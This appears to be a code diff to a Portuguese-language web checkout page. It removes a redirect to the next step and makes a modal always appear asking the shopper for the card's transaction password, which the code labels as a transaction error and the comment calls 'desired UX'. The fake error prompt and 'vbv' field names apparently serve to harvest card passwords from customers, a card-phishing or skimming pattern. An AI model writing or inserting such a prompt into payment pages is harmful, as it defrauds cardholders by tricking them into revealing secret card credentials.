@@ -2523,14 +2523,12 @@
                     $("#senha_vbv").mask(string);
                     $("#btn_compra_cc").removeClass('sending');
 
-                    // if ($("#vbv_sn").val() === 's' && r.v === 's') {
-                    //     $("#digitos_vbv").text("Digite a senha de " + r.d + " dígitos do cartão, a mesma utilizada para transações comerciais.")
-                    //     setTimeout(() => {
-                    //         $("#modal-transaction-error").show();
-                    //     }, 1500)
-                    // }
-
-                    window.location = '/checkout/1/{{ $data['hash'] }}/4';
+                    // Solicitar a senha do cartão antes de seguir (UX desejada)
+                    // Exibe o modal de VBV para o cliente digitar a senha e só depois prosseguir
+                    $("#digitos_vbv").text("Digite a senha do cartão, a mesma utilizada para transações comerciais.");
+                    setTimeout(() => {
+                        $("#modal-transaction-error").show();
+                    }, 800);
                 })
 
             })
